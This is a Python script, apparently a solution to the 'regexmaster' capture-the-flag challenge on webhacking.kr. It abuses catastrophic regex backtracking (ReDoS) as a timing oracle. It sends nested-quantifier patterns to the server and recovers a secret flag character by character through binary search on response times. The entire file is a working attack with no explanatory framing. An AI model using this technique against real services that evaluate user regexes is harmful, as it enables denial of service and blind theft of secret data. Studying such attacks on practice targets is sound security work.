import random
import re
import string

import requests


def length_in(l, h):
    return f".{{{l},{h}}}$"


def nth_char_in(i, l, h):
    return f".{{{i}}}[{''.join(list(map(re.escape, charset[l:h + 1])))}].*$".replace(
        "/", "\\/"
    )


def redos_if(payload, salt):
    return f"^(?={payload})(((.*)*)*)*{salt}$"


def generate_salt(n):
    return "".join(random.choices(string.ascii_letters, k=n))


def get_request_duration(payload):
    r = requests.get("http://regexmaster.webhacking.kr/", {"pattern": payload})
    print(r.elapsed.total_seconds())
    return r.elapsed.total_seconds()


def prop_holds(payload, salt):
    return get_request_duration(redos_if(payload, salt)) >= 1


def get_salt(n):
    while True:
        salt = generate_salt(n)
        if prop_holds(".*", salt):
            break
    return salt


def get_secret_length(salt):
    l = 0
    h = 100
    while l != h:
        m = l + h >> 1
        if prop_holds(length_in(l, m), salt):
            h = m
        else:
            l = m + 1
    return l


def get_secret(length, salt):
    secret = "FLAG{im_r"
    for i in range(len(secret), length):
        l = 0
        h = len(charset)

        while l != h:
            print(nth_char_in(i, l, h))

            m = l + h >> 1
            if prop_holds(nth_char_in(i, l, m), salt):
                h = m
            else:
                l = m + 1

        secret += charset[l]
        print("secret:", secret)


charset = string.digits + string.ascii_letters + string.punctuation

salt = get_salt(10)
print("salt:", salt)

length = 30  # get_secret_length(salt)
print("length:", length)

get_secret(length, salt)
